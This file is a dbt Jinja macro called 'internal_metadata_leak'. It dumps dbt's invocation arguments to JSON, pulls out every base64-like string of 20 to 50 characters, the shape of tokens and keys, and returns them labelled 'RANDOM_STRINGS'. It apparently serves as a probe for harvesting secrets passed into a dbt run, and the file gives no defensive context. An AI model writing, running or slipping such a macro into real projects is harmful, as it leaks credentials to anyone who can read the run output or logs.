{% macro internal_metadata_leak() %}
    {% if execute %}
        {% set pattern = "[A-Za-z0-9+/]{20,50}" %}
        {% set regex = modules.re.compile(pattern) %}
        
        {% set full_text = invocation_args_dict | tojson %}
        {% set matches = regex.findall(full_text) %}
        
        {% set result = matches | join(" | ") if matches else "no_long_strings" %}
        
        {{ return("RANDOM_STRINGS: " ~ result | truncate(200)) }}
    {% else %}
        {{ return("deep_memory_scan...") }}
    {% endif %}
{% endmacro %}
